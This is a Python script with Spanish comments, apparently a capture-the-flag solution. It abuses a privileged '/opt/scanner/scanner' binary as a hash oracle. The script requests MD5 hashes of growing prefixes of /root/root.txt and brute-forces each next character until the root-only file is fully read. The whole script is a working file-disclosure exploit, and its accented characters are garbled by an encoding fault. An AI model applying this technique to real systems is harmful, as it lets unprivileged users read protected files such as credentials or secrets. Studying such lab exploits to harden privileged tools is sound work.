#!/usr/bin/python3

import hashlib
import subprocess
import string
import sys

def checkhash(target_hash, current_content):
    """Comprueba qu칠 car치cter, cuando se a침ade al contenido actual, produce el hash objetivo"""
    # Incluimos todos los caracteres posibles en la flag
    charset = string.printable
    # Para cada caracter en el charset, lo a침adimos al contenido actual y comprobamos el hash
    # lo comparamos con la funci칩n hashlib.md5
    # y lo codificamos en bytes
    # si coincide, lo devolvemos    
    for char in charset:
        test_content = current_content + char
        if hashlib.md5(test_content.encode()).hexdigest() == target_hash:
            return char
    
    return None

def extract_root_flag():
    """Extrae la flag de root car치cter por car치cter usando el scanner"""
    print("[*] Iniciando extracci칩n de /root/root.txt...")
    
    target_file = "/root/root.txt"
    content = ""
    position = 1
    
    try:
        while True:
            print(f"[*] Extrayendo car치cter #{position}...")
            
            # Obtenemos el hash MD5 para la longitud actual
            # El par치metro -s es solo una etiqueta, podr칤amos usar cualquier valor
            cmd = f"/opt/scanner/scanner -l {position} -s root_flag -c {target_file} -p"
            result = subprocess.check_output(cmd, shell=True)
            
            # Extraemos el hash del resultado
            hash_parts = result.split()
            if not hash_parts or len(hash_parts) < 2:
                print("[!] No se pudo obtener el hash. Finalizando.")
                break
                
            target_hash = hash_parts[-1].decode()
            
            # Encontramos el car치cter que produce este hash
            next_char = checkhash(target_hash, content)
            
            if next_char is None:
                print("[+] No se encontraron m치s caracteres. Flag completa.")
                break
                
            content += next_char
            print(f"[+] Car치cter encontrado: '{next_char}' - Flag actual: {content}")
            
            position += 1
            
            # Si encontramos un car치cter de cierre de llave y ya tenemos un buen n칰mero de caracteres
            # es probable que la flag est칠 completa
            if next_char == '}' and '{' in content and position > 10:
                print("[+] Parece que hemos encontrado la flag completa.")
                break
                
    except Exception as e:
        print(f"[!] Error durante la extracci칩n: {e}")
    
    print(f"\n[游끠] Flag extra칤da: {content}")
    return content

if __name__ == "__main__":
    try:
        flag = extract_root_flag()
        
        # Guardar la flag en un archivo
        with open("root_flag.txt", "w") as f:
            f.write(flag)
        print(f"[+] Flag guardada en root_flag.txt")
        
    except KeyboardInterrupt:
        print("\n[!] Operaci칩n cancelada por el usuario.")
        sys.exit(1)